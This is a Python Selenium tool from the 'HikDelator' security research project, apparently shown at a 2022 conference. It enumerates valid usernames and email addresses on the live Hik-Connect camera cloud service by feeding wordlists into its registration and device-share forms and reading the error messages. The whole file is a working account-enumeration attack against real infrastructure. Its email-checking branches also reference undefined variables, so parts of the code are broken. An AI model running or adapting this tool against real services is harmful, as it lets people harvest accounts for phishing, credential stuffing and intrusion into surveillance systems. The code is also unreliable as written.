#Herramienta desarrollada para el proyecto HikDelator, 
#investigacion realizada por Denny Rodriguez {LinkedIn : https://www.linkedin.com/in/alxnovax} y 
#jonathan maderos {LinkedIn : https://www.linkedin.com/in/jonathan-maderos-04478920}
#presentada en el dia 06/09/2022 en la DragonJar Security Conference, Manizales 2022

# Author: Jeremy Landa {LinkedIn : https://www.linkedin.com/in/jeremy-david-landa-6187b7176}
# Author: Diego Aristiguieta {LinkedIn : https://www.linkedin.com/in/diego-aristiguieta-60236b163}

#Si quieres Colaborar con el proyecto no olvides mencionar a los autores.

from time import sleep
from selenium import webdriver
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from colorama import init, Fore, Back, Style

#Variables Globales

dormir = 1
url = 'https://www.hik-connect.com/register?from=c17392dc2e6c405a931b&host=www.hik-connect.com'
init(autoreset=True)

def banner():
    print(Fore.RED + Style.BRIGHT+ Back.WHITE + "\t       __ __ __" + Fore.BLACK +"   ___       _       _             ")
    print(Fore.RED + Style.BRIGHT+ Back.WHITE + "\t  /\  / // // /__" + Fore.BLACK +"| __ \___ | | __ _| |_" + Fore.GREEN +" ___" + Fore.BLACK +"  _ __ ")
    print(Fore.RED + Style.BRIGHT+ Back.WHITE + "\t / /_/ // // // /" + Fore.BLACK +"| | \ \ _ | |/ _` | __" + Fore.GREEN +"/   \\"+ Fore.BLACK +"| '__|")
    print(Fore.RED + Style.BRIGHT+ Back.WHITE + "\t/ __  // //  v < " + Fore.BLACK +"| |_/ / __| | (_| | |" + Fore.GREEN +"|  ✓ |"+ Fore.BLACK +"| |   ")
    print(Fore.RED + Style.BRIGHT+ Back.WHITE + "\t\/ /_// //__|\_/ " + Fore.BLACK +"|____/\___|_|\__,_|\__" + Fore.GREEN +"\___/"+ Fore.BLACK +"|_|   ")

def login(url, correologin, passlogin):
    sleep(1)
    sel('#basic_account').send_keys(f'{correologin}')
    sel('#basic_password').send_keys(f'{passlogin}')
    sel('div.ant-row:nth-child(4) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > button:nth-child(1)').click()
    sleep(15)

def seleccion ():
# Modulo de busqueda por usuarios
    mode = input('Seleccione el modo de uso\n [1] Usuarios.\n [2] Emails.\n')
    if mode == '1':
        url = 'https://www.hik-connect.com/register?from=c17392dc2e6c405a931b&host=www.hik-connect.com'
        mode2 = input(f'El modo seleccionado fue [1]\nBuscar usuarios por:\n [1] usuario unico. \n [2] Lista de usuarios.\n')
        if mode2 == '1':
            usernamee = input('Introduzca el usuario a buscar: ')
            return [1, usernamee]
        elif mode2 == '2':
            dicc = input('Diccionario por defecto:wordlist.txt\nIntroduzca el diccionario de usuarios: ')
            if dicc == '':
                dicc = 'wordlist.txt'
                return [2, dicc]
            return [2, dicc]

# Modulo de busqueda por emails
    elif mode == '2':
        logn = []
        logn.append(input('Introduzca el correo o usuario del sistema Hik-Connect: '))
        logn.append(input('Introduzca la contraseña del sistema Hik-Connect: '))
        url = 'https://ieu.hik-connect.com/views/login/index.html?returnUrl=http://ieu.hik-connect.com/share/add/page&r=8244690437308373445&host=ieu.hik-connect.com&from=c17392dc2e6c405a931b#/'
        mode2 = input(f'El modo seleccionado fue [2]\nBuscar Emails por:\n [1] Email unico. \n [2] Lista de Emails.\n')
        if mode2 == '1':
            usernamee = input('Introduzca el email a buscar: ')
            return [3, usernamee, logn]
        elif mode2 == '2':
            dicc = input('Diccionario por defecto:wordlistmail.txt\nIntroduzca el diccionario de Emails: ')
            if dicc == '':
                dicc = 'wordlistmail.txt'
                return [4, dicc, logn]
            return [4, dicc, logn]



if __name__ == "__main__":
    banner()
    select = seleccion()

    driver = webdriver.Firefox()
    sel = driver.find_element_by_css_selector
    selx = driver.find_element_by_xpath

    if select[0] == 1:
        driver.get(url)
        sel('#username').click()
        sel('#username').send_keys(f'{select[1]}')
        sel('#password').click()
        sleep(dormir)
        try:
            err = sel('label.error').text
            if err == 'The user name is used. Please try another one':
                print (f'[+] El usuario {select[1]} existe')

        except:
            print (f'[-] El usuario {select[1]} no existe')



    elif select[0] == 2:
        driver.get(url)
        lineas = [line.rstrip('\n') for line in open(select[1])]
        for user in lineas:
            for i in range(12):
                sel('#username').send_keys(Keys.BACKSPACE)
            sel('#username').click()
            sel('#username').send_keys(f'{user}')
            sel('#password').click()
            sleep(dormir)
            try:
                err = sel('label.error').text
                if err == 'The user name is used. Please try another one':
                    print (f'[+] El usuario {user} existe')
            except:
                print (f'[-] El usuario {user} no existe')


    elif select[0] == 3:
        url = 'https://ieu.hik-connect.com/views/login/index.html?returnUrl=http://ieu.hik-connect.com/share/add/page&r=8244690437308373445&host=ieu.hik-connect.com&from=c17392dc2e6c405a931b#/'
        driver.get(url)

        login(url, select[2][0], select[2][1])
        
        sel('#email').send_keys(f'{select[1]}')
        sel('#remark').click()
        sel('#remark').send_keys('a')
        sleep(dormir)
        sel('#email').click()
        try:
            exist = sel('label.error').text
            if exist == 'The account does not exist.':
                print(f'[-] El correo {select[1]} no existe en el sistema')
            elif err == 'You cannot share it to other regions.':
                print (f'[+] El usuario {select[1]} existe')
            elif err == 'Incorrect email format.':
                    print(f'[!] El formato de correo es invalido')
            elif err == 'You cannot share it to yourself.':
                print(f'[+] El correo {email} existe')
        except:
            print(f'[+] El correo {select[1]} existe en el sistema')
        
    
    elif select[0] == 4:
        url = 'https://ieu.hik-connect.com/views/login/index.html?returnUrl=http://ieu.hik-connect.com/share/add/page&r=8244690437308373445&host=ieu.hik-connect.com&from=c17392dc2e6c405a931b#/'
        driver.get(url)
        
        login(url, select[2][0], select[2][1])
        
        lineas = [line.rstrip('\n') for line in open(select[1])]
        for email in lineas:
            for i in range(32):
                sel('#email').send_keys(Keys.BACKSPACE)
            sel('#email').send_keys(f'{email}')
            sel('#remark').click()
            sel('#remark').send_keys('a')
            sleep(dormir)
            sel('#email').click()
            sleep(dormir)
            try:
                exist = sel('label.error').text
                if exist == 'The account does not exist.':
                    print(f'[-] El correo {email} no existe en el sistema')
                elif err == 'You cannot share it to other regions.':
                    print (f'[+] El correo {email} existe')
                elif err == 'Incorrect email format.':
                    print(f'[!] El formato de correo es invalido')
                elif err == 'You cannot share it to yourself.':
                    print(f'[+] El correo {email} existe')
            except:
                print(f'[+] El correo {email} existe en el sistema')

    banner()
